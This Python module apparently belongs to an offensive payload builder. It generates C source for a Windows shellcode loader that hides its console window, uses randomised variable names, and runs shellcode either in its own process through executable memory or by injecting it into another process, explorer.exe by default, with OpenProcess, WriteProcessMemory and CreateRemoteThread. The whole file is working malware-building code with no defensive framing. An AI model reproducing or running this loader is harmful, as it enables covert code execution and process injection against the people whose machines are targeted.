from lib import core

VAR_SHELLCODE = core.VARNAME_CREATOR()


def MODEL():

    hWnd = core.VARNAME_CREATOR()

    BEGIN_CODE = "#define _WIN32_WINNT 0x0500\n"
    BEGIN_CODE += "#include <windows.h>\n"
    BEGIN_CODE += "#include <tlhelp32.h>\n"
    BEGIN_CODE += "#include <stdio.h>\n"
    BEGIN_CODE += "#include <stdlib.h>\n"
    BEGIN_CODE += "#include <time.h>\n"
    BEGIN_CODE += "int main(int argc, char **argv){\n"
    BEGIN_CODE += "HWND " + hWnd  + " = GetConsoleWindow();\n"
    BEGIN_CODE += "ShowWindow(" + hWnd + ", SW_HIDE );\n"
    BEGIN_CODE += "unsigned char " + VAR_SHELLCODE + "[] = \n"

    return BEGIN_CODE


def LOCAL_OR_REMOTE():
    core.LOCAL_OR_REMOTE()

    CHOICE = core.CORE_INPUT()

    if CHOICE == "1":
        VALUE_LOCAL_THREAD_INJECTION = LOCAL_THREAD_INJECTION()
        return VALUE_LOCAL_THREAD_INJECTION

    elif CHOICE == "2":
        core.WHICH_PROCESS()

        PROCESSNAME = core.CORE_INPUT()

        if PROCESSNAME != "":
            VALUE_REMOTE_THREAD_INJECTION = REMOTE_THREAD_INJECTION(PROCESSNAME)
            return VALUE_REMOTE_THREAD_INJECTION

        else:
            PROCESSNAME = "explorer.exe"
            VALUE_REMOTE_THREAD_INJECTION = REMOTE_THREAD_INJECTION(PROCESSNAME)
            return VALUE_REMOTE_THREAD_INJECTION
    else:
        VALUE_LOCAL_THREAD_INJECTION = LOCAL_THREAD_INJECTION()
        return VALUE_LOCAL_THREAD_INJECTION


def LOCAL_THREAD_INJECTION():
    EXEC = core.VARNAME_CREATOR()

    VAR_LOCAL_THREAD_INJECTION = "void *" + EXEC + " = VirtualAlloc(0, sizeof " + VAR_SHELLCODE + ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
    VAR_LOCAL_THREAD_INJECTION += "memcpy(" + EXEC + ", " + VAR_SHELLCODE + ", sizeof " + VAR_SHELLCODE + ");\n"
    VAR_LOCAL_THREAD_INJECTION += "((void(*)())" + EXEC + ")();\n"
    VAR_LOCAL_THREAD_INJECTION += "}\n"
    return VAR_LOCAL_THREAD_INJECTION


def REMOTE_THREAD_INJECTION(PROCESSNAME):
    ENTRY = core.VARNAME_CREATOR()
    SNAPSHOT = core.VARNAME_CREATOR()
    PROCESS_HANDLE = core.VARNAME_CREATOR()
    REMOTE_THREAD = core.VARNAME_CREATOR()
    REMOTE_BUFFER = core.VARNAME_CREATOR()

    VAR_REMOTE_THREAD_INJECTION = "PROCESSENTRY32 " + ENTRY + ";\n"
    VAR_REMOTE_THREAD_INJECTION += ENTRY + ".dwSize = sizeof(PROCESSENTRY32);\n"
    VAR_REMOTE_THREAD_INJECTION += "HANDLE " + SNAPSHOT + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
    VAR_REMOTE_THREAD_INJECTION += "if (Process32First(" + SNAPSHOT + ", &" + ENTRY + ") == TRUE){\n"
    VAR_REMOTE_THREAD_INJECTION += "while (Process32Next(" + SNAPSHOT + ", &" + ENTRY + ") == TRUE){\n"
    VAR_REMOTE_THREAD_INJECTION += 'if (stricmp(' + ENTRY + '.szExeFile, ' + '"' + PROCESSNAME + '"' + ') == 0){\n'
    VAR_REMOTE_THREAD_INJECTION += "HANDLE " + PROCESS_HANDLE + ";\n"
    VAR_REMOTE_THREAD_INJECTION += "HANDLE " + REMOTE_THREAD + ";\n"
    VAR_REMOTE_THREAD_INJECTION += "PVOID " + REMOTE_BUFFER + ";\n"
    VAR_REMOTE_THREAD_INJECTION += PROCESS_HANDLE + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + ENTRY + ".th32ProcessID);\n"
    VAR_REMOTE_THREAD_INJECTION += REMOTE_BUFFER + " = VirtualAllocEx(" + PROCESS_HANDLE + ", NULL, sizeof " + VAR_SHELLCODE + ", (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);\n"
    VAR_REMOTE_THREAD_INJECTION += "WriteProcessMemory(" + PROCESS_HANDLE + ", " + REMOTE_BUFFER + ", " + VAR_SHELLCODE + ", sizeof " + VAR_SHELLCODE + ", NULL);\n"
    VAR_REMOTE_THREAD_INJECTION += REMOTE_THREAD + " = CreateRemoteThread(" + PROCESS_HANDLE + ", NULL, 0, (LPTHREAD_START_ROUTINE)" + REMOTE_BUFFER + ", NULL, 0, NULL);\n"
    VAR_REMOTE_THREAD_INJECTION += "CloseHandle(" + PROCESS_HANDLE + ");}}}\n"
    VAR_REMOTE_THREAD_INJECTION += "CloseHandle(" + SNAPSHOT + ");}\n"

    return VAR_REMOTE_THREAD_INJECTION
